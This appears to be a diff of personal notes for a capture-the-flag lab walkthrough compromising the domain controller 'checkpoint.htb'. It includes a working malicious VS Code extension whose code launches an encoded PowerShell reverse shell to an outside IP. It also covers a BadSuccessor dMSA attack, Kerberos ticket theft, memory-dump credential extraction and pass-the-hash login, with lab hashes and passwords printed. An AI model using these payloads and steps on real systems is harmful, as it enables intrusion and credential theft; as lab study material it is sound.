@@ -11,13 +11,262 @@ List share files for alex.turner : smbmap -H dc01.checkpoint.htb -u alex.turner 
 
 We discover the share DevDrop and the user svc_deploy who might have write access in that share.
 
+ldap enumeration with netexec ldap ... --groups
+netexec ldap dc01.checkpoint.htb -u alex.turner -p Checkpoint2024!  --groups
+
+Then using bloodyAD, we get a lot of information ...getobject
+
+bloodyAD   --host dc01.checkpoint.htb   -d checkpoint.htb   -u alex.turner   -p 'Checkpoint2024!'   add computer Kuser 'Password123!K'   --ou "OU=Employees,DC=checkpoint,DC=htb"
+[+] Kuser$ created
+
+---
+bloodyAD --host dc01.checkpoint.htb \
+  -d checkpoint.htb \
+  -u alex.turner \
+  -p 'Checkpoint2024!' \
+  set restore \
+  "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
+[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
+
+
+bloodyAD ... get writable --detail --> discover we have a lot of rights on Mark's account.
+
+Restore the Mark account, attempt to modify its password :(
+    try to impersonate him, and gaining a shell, trying to set its ms-ds-AllowedToActOnBehalfOfOthers by using bloodyAD, impacket-rbcd :(
+    setting its SPN :) and trying to get a ticket with impacket-GetUsersSPNs :)
+
+---
+
+Man, you won't even guess what this is Ahahahah, the password of Mark Davies in the smb is the same password as Alex Turner.
+```
+netexec smb dc01.checkpoint.htb -u mark.davies -p Checkpoint2024!  --shares
+SMB         10.129.21.29    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
+SMB         10.129.21.29    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
+SMB         10.129.21.29    445    DC01             [*] Enumerated shares
+SMB         10.129.21.29    445    DC01             Share           Permissions     Remark
+SMB         10.129.21.29    445    DC01             -----           -----------     ------
+SMB         10.129.21.29    445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.21.29    445    DC01             C$                              Default share
+SMB         10.129.21.29    445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
+SMB         10.129.21.29    445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.21.29    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.21.29    445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.129.21.29    445    DC01             VMBackups
+```
+Ahahah thank !
+
+---
+bloodyAD --host dc01.checkpoint.htb   -d checkpoint.htb   -u mark.davies   -p 'Checkpoint2024!'   get bloodhound
+[+] Connecting to LDAP server
+[+] Connected to LDAP serrver
+Dumping schema: 2it [00:00, 18.17it/s]
+Generating lookuptable: 107it [00:00, 175.25it/s]
+Dumping SDs: 100%|███████████████████████████████████████████████████████████████████████| 111/111 [00:08<00:00, 12.65it/s]
+Dumping domains: 100%|███████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  4.98it/s]
+Dumping users: 100%|██████████████████████████████████████████████████████████████████████| 18/18 [00:00<00:00, 133.80it/s]
+Dumping computers: 100%|█████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 11.43it/s]
+Dumping groups: 100%|█████████████████████████████████████████████████████████████████████| 58/58 [00:00<00:00, 596.47it/s]
+Dumping GPOs: 100%|██████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00, 39.30it/s]
+Dumping OUs: 100%|██████████████████████████████████████████████████████████████████████████| 8/8 [00:00<00:00, 158.75it/s]
+Dumping Containers: 100%|█████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 127.12it/s]
+[+] Bloodhound data saved to 20260618T103757_Bloodhound.zip
+[+] Found 0 trusts
+
+So I could use bloodyAD as a collector, nice ! 
+
 }
 
 [Exploitation]{
+Now that Mark has right access on the DevDrop share.
+I tried to upload a malicious vsix that I have done ( with npm,vcse  and a lot of import ) and it didn't work. It upload a malicious vsix which was made simply without import, and the payload was now base64 (powersell -e ... ) which works instantly.
+.
+├── [Content_Types].xml
+├── extension
+│   ├── extension.js
+│   └── package.json
+└── revshell.vsix
+
+cat extension/extension.js 
+const cp = require('child_process');
+exports.activate = function() {
+  cp.exec('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAzADYAIgAsADcANwA3ADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA');
+}
+exports.deactivate = function() {}
+
+cat extension/package.json 
+{
+  "name": "devtools-helper",
+  "displayName": "DevTools Helper",
+  "version": "1.0.0",
+  "engines": {"vscode": "^1.118.0"},
+  "activationEvents": ["*"],
+  "main": "./extension.js",
+  "contributes": {}
+}
+
+then zip -r revshell.vsix '[Content_Types]' extension/
+
+And we got a shell as ryan.
 
 }
 
 [PrivEsc]{
+Remember to try the rbcd or kerberoast attack to get to svc_deploy
+---
+we use the Get-BadSuccessorOUPermissions.ps1 to see if ryan.brooks could be used to through BadSuccessor, it seems we can do it with ryan and alex, but ryan is the one we look for ( he is ADconnected with svc_deploy ), so we just have to request a ticket, use the hash really well.
+PS C:\Users\ryan.brooks\Desktop> C:\Shares\DevDrop\Get-BadSuccessorOUPermissions.ps1
+
+Identity               OUs                                 
+--------               ---                                 
+CHECKPOINT\ryan.brooks {OU=DMSAHolder,DC=checkpoint,DC=htb}
+CHECKPOINT\alex.turner {OU=Employees,DC=checkpoint,DC=htb} 
+
+So here come the magic, we don't have ryan password, but we need cred to create or launch the dMSA Bad successor attack to get a hash as svc_deploy. We use Rubeus.exe to get a ticket which will be use to authenticate to launch the Bad Successor attack.
+C:\Shares\DevDrop\Rubeus.exe tgteg /nowrap
+we get it and go base64 decoded it and put it ryan.kirbi ( echo "..." | base64 -d > ryan.kirbi )
+impacket-ticketConverter ryan.kirbi ryan.ccache ( we get the ccache and use it with bloodyad to launch the badSuccessor )
+```bash
+bloodyAD --host dc01.checkpoint.htb   -d checkpoint.htb   -u ryan.brooks -k ccache=ryan.ccache add badSuccessor Kdmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
+Clock skew detected. Adjusting local time by 5:00:09.153440. Retrying operation.                          15:05:27 [19/1230]
+[+] Creating DMSA Kdmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb                                          
+[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB                                
+Clock skew detected. Adjusting local time by 5:00:09.145424. Retrying operation.                        
+                                                                                                                            
+Realm        : CHECKPOINT.HTB                                                                                               
+Sname        : krbtgt/CHECKPOINT.HTB                                                                                        
+UserName     : Kdmsa$                                                                                                       
+UserRealm    : checkpoint.htb                                                                                               
+StartTime    : 2026-06-18 20:05:37+00:00                                                                                    
+EndTime      : 2026-06-19 05:47:22+00:00          
+RenewTill    : 2026-06-25 19:47:22+00:00
+Flags        : enc-pa-rep, forwardable, renewable, forwarded, pre-authent
+Keytype      : 18                                                                                                           
+Key          : otZb5MEA0jAp9VXwHYjo6sPzddPoCg+F3HBKw1bIB/M=
+EncodedKirbi :                                                
+
+    doIFuzCCBbegAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3Ji
+    dGd0Gw5DSEVDS1BPSU5ULkhUQqOCBF8wggRboAMCARKhAwIBAqKCBE0EggRJjOC78qWTZM+u4KsPrwHSz42hwcL9uCN+mN+3+L0B
+    uOdHs5c4//lCaA1bspVy1yZtIL7m4nLbuzgTiuFUM2jF2p28NeC0aXcwJVmVUlck08uHBHLC6+dilUt8J+oTW7UC1jYvJ9ZQrXwh
+    8HmZ4tsMl2LrKgobkR1a8ezN8ru9NPL13QA9+PVFghmDdOTxoCBwcg+ffojfviDXXZPsED7H5lo8nbpx5QGA0rq1aAF1SUGVn6C4
+    RR8mnDF4mgOLSpVjoo+qUFoZvc6ZojamOs2BJAwQ/NFdutw532L16bhjFhczlkeZxilgHfRhiqekO+8cyUTdKwYl0lhqjrHEC8P2
+    imyQBnEDrxGliFDg9fV2vb/7SSHRFGlChAVM0esG+Fejj+oT35q8II17tGuQTjN86SQfCH+WPq8FQlaHDPcrcroNyzbjdV3cevI9
+    4ggrmUxWu9iR1iU3WA2wsEoOGnufv0QMDu957/gisgTmNg2aJPzoWb8wLgJFiqfAHjBvoO5XYsRs5aiH9123me8KPsgEAyA4W3j6
+    qE3D2zPUVqc618vT4B6LXgu0z2b3ZgWD3r+xB3i69iQx0CNsaz2NC3bPUx+9uFIA97wCPmPEboWkEmBzEMkVW4vXXtBFrePzSXLJ
+    JVynEPCI7r54RCcqbT2JbK4xkKSBUQ5DPi9c18STqjI9NzKmOZ1hom+SslNXqBlx7uFvpTVDyOpBChOBAw9ewMsKQ5nlxCUy1FuK
+    li7RBGCpEt/JfZTeBT6OTLf7euuM/1PN7L83C8IpXSpdWmoJOJ52TsqlL+SIM3uxT58hHAya2aJhwpkQv+VJdYuUudvWNYQ63zw7
+    btWgxQqJmT46ItLwcq4NvTMS5APnBpZPp0OoCVcl5ZMaRkeajvMXSIRBOhWfHfOceoDDqNI72yQC2n4EjW1xev7pC25Cz2Qef/B9
+    BX8iMxCxalTG29qh+TjEomv9DIdBf8bK1tQE+BiSUFoavN3CoM/wN4IlwRv/E/E1yVFshaGBEaFdG+7tS8PhFgPSXGBvAuvcW9ze
+    1WLlPJ639HwfVZkZtHg8quZZmxbef38FIhEpFtA6sCMZ3J8YdWcbm5hoeEWY7UXm+ghNFYvngi1dDJUdLNjdh9nt0tkWqv1hqlV1
+    nGsNvZ7B9HZoTT9V4SevqTD8TNN6prls3RTKQrMbj/dKys5C9xiQlRDz1/dq8acwddsJVHzmj9qWTs/371VQccBapZfkkHIoXbf5
+    kE4G1pg7IotvxL8nZP5jJzA4Q6xR9MAhZ3lQd3Ah0p7YQU9yD53JB0Nja9dA2IR1M9+HC7gpmJNZbV2folbkXg7aachYS0ELWYLB
+    5eZXUo/QxW1HIwBZenhCvGGK997aNfME7N+h04WUycE3+tAObJFr+KgXW3L0pfyXaBnFiyIk0BvND20gzjW9mS9S/WPSCa6hOtlp
+    8fND+jK6cVqwcuJmFoUU1t2jgfswgfigAwIBAKKB8ASB7X2B6jCB56CB5DCB4TCB3qArMCmgAwIBEqEiBCCi1lvkwQDSMCn1VfAd
+    iOjqw/N10+gKD4XccErDVsgH86EQGw5jaGVja3BvaW50Lmh0YqITMBGgAwIBAaEKMAgbBktkbXNhJKMFAwMAYKGkERgPMjAyNjA2
+    MTgxOTQ3MjJapREYDzIwMjYwNjE4MjAwNTM3WqYRGA8yMDI2MDYxOTA1NDcyMlqnERgPMjAyNjA2MjUxOTQ3MjJaqBAbDkNIRUNL
+    UE9JTlQuSFRCqSMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQg==
+[+] dMSA TGT stored in ccache file Kdmsa_cN.ccache
+
+dMSA current keys found in TGS: 
+AES256: 9b8c48019920ec46793299581f40de13a8fda8bb3ce6482c14609e0eec9c91a3
+AES128: f22789f52806641d7291e6b7851d2a08
+RC4: abd2881f27b74ab7cbeda5e06664c60d
+
+dMSA previous keys found in TGS (including keys of preceding managed accounts):
+RC4: e16081eb077aca74bdbf8af12af43ac9
+```
+We will use the RC4 hash as it has been used to managed accounts ( which should be be svc_deploy as it is the only one which could have been managed right ? let's just suppose ! Ahaaaahhaah !
+svc_deploy RC4 Hash : e16081eb077aca74bdbf8af12af43ac9
+```bash
+netexec smb dc01.checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares
+SMB         10.129.25.92    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
+SMB         10.129.25.92    445    DC01             [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9 
+SMB         10.129.25.92    445    DC01             [*] Enumerated shares
+SMB         10.129.25.92    445    DC01             Share           Permissions     Remark
+SMB         10.129.25.92    445    DC01             -----           -----------     ------
+SMB         10.129.25.92    445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.25.92    445    DC01             C$                              Default share
+SMB         10.129.25.92    445    DC01             DevDrop                         VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
+SMB         10.129.25.92    445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.25.92    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.25.92    445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.129.25.92    445    DC01             VMBackups       READ
+```
+Now we have read access over a particular interesting share : VMBackups
+
+PS: I think what could have been a sign to use Bad Successor attack is the `Windows 11 / Server 2025 Build 26100 x64` that we have been seeing a lot and the fact that the dMSA attack give all these privileges on the 2025 one.
+
+We connect to the smb share with 
+  smbclient //dc01.checkpoint.htb/VMBackups -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash
+we list and see a lot of stuff, 
+smb: \NightlyBackup_2024-11-01\memory forensics\> get "Windows Server 2019-Snapshot1.vmem"                                  
+getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem of size 2147483648 as Windows Server 2019-Snapshot1.vmem (2954.6 KiloBytes/sec) (average 2954.6 KiloBytes/sec)
+
+We get this snapshot ( cause it is a memory dump and could contain useful informations ) and examine it .
+Try to use vol but didn't find the way to quickly get cred (hashes/plain), then let's use vmkatz :
+```bash
+/opt/tools/vmkatz Windows\ Server\ 2019-Snapshot1.vmem                                                                
+[*] vmkatz v1.4.1                                                                                                           [*] System discovery: 8.544134772s
+[*] Process enumeration: 222.352195ms
+[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(empty)
+[*] Credential extraction: 239.996406ms
+                                                              
+[+] 2 logon session(s), 2 with credentials:       
+                               
+  LUID: 0x3e4 (NETWORK SERVICE)                               
+  Username: WIN-0DG6SJAEUTA$                                  
+  Domain: WORKGROUP                                           
+  [DPAPI]
+    GUID          : 632b77c8-5e1a-4479-8e35-baa290fdd6ae
+    MasterKey     : 15e104f6de4e478c6bf55252632a25b973fccd39c2be8cc0d5b15a5dec06029f02fe0a02a3e57eb3b55f077f83a283cd0a11f6b3
+c6508d9e585527de78dc989e
+    SHA1 MasterKey: 44bb34a624afcd186909843e6cbdb4cfee908975
+  [DPAPI]
+    GUID          : 57e1a5d6-bbd4-44e9-a5c4-f4241b0821b0
+    MasterKey     : 95f668c165e7c0b3bd1f525330e5a647b9c9c8da7320c6fbdb4518a588bac996567e04f22b28d4f7a2abd33fafe0958522bca1aa
+a0de00f5edb7d6742065642d
+    SHA1 MasterKey: b2bf2c648554143d6b28b3c06a1ece7e40867238
+  [DPAPI]
+    GUID          : 4f09a449-22e7-4a65-a4b9-fac89cc25328
+    MasterKey     : e4778f7e1b8351eade5c49bb8e32503fbbaa705bb7e26eef5785e0a8200e31fcc2458a4db00e03aaabef34bd47900beee2d8a5bb
+73ddd904fbe279089a1ea718
+    SHA1 MasterKey: 90b1c277630e507a8e28d7b260a53f21712c3f1d
+
+  LUID: 0x14016d               
+  Session: 2 | LogonType: Unknown                             
+  Username: Administrator                                     
+  Domain: WIN-0DG6SJAEUTA                                     
+  LogonServer: WIN-0DG6SJAEUTA
+  LogonTime: 2026-05-09 14:07:14 UTC                    
+  SID: S-1-5-21-2823729479-30462974-3865623546-500                                                                          
+  [MSV1_0]              
+    NT Hash : f29e9c014295b9b32139b09a2790be3b              
+    SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
+    DPAPI   : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e  
+  [DPAPI]                                                                                                                   
+    GUID          : c53f7d5b-2902-415c-9c09-251f39974440
+    MasterKey     : 32cc5c309067ca0994b849897a9b85b89511547030a1d8b74fe6e37ba037a4161301ffce692e6e433c3821dc18abfe208e1dc5c4
+58de79d1352c6681e18bde15
+    SHA1 MasterKey: b061f87be6d2776897d912fed9156a354b81a595
+                                                                                                                            
+[*] 2 sessions, 1 NT hashes, 0 plaintext passwords
+```
+We got the NT Hash of Administrator: f29e9c014295b9b32139b09a2790be3b
+Let's use to connect through evil-winrm and get the root.txt
+evil-winrm -u Administrator -H f29e9c014295b9b32139b09a2790be3b -i checkpoint.htb
+
+And we get the root.txt ( at the Desktop of max.palmer )
+*Evil-WinRM* PS C:\Users\max.palmer\Desktop> Get-Content root.txt
+
+Great !
 
 
+}
+
+[Ref/Links]{
+https://github.com/akamai/BadSuccessor
+https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html
+https://github.com/CravateRouge/bloodyAD/wiki/Authentication-Methods
+https://github.com/noobosaurus-r3x/Cheat-sheets/tree/main
+https://github.com/nikaiw/VMkatz
+...
 }
